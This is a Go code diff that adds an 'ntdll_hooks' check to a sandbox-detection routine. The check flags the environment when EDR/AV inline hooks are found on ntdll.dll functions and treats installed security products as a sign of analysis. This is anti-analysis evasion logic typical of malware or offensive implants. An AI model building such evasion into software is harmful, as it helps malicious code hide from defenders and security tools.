@@ -171,6 +171,7 @@ func CheckSandbox() *Verdict {
 		fn   func() (detected bool, reason string)
 	}{
 		{"debugger_present", checkDebugger},
+		{"ntdll_hooks", checkNtdllHooks},
 		{"cpu_floor", checkCPUFloor},
 		{"memory_floor", checkMemoryFloor},
 		{"disk_floor", checkDiskFloor},
@@ -248,6 +249,26 @@ func checkDebugger() (bool, string) {
 	}
 
 	return false, ""
+}
+
+// checkNtdllHooks detects user-mode inline hooks on critical ntdll.dll
+// functions.  EDR/AV products place these hooks to intercept syscalls, so
+// their presence strongly indicates an analysis or controlled environment.
+//
+// A single hooked function is sufficient to flag — unlike CPU or disk
+// checks, false positives from inline hooks are extremely rare (they only
+// occur when a legitimate security product is installed).
+func checkNtdllHooks() (bool, string) {
+	result := ScanNtdllHooks()
+	if result == nil || !result.IsHooked {
+		return false, ""
+	}
+
+	names := make([]string, len(result.HookedFunctions))
+	for i, h := range result.HookedFunctions {
+		names[i] = h.FunctionName
+	}
+	return true, fmt.Sprintf("ntdll functions hooked: %s", strings.Join(names, ", "))
 }
 
 // checkCPUFloor flags systems with fewer than 2 logical CPUs.
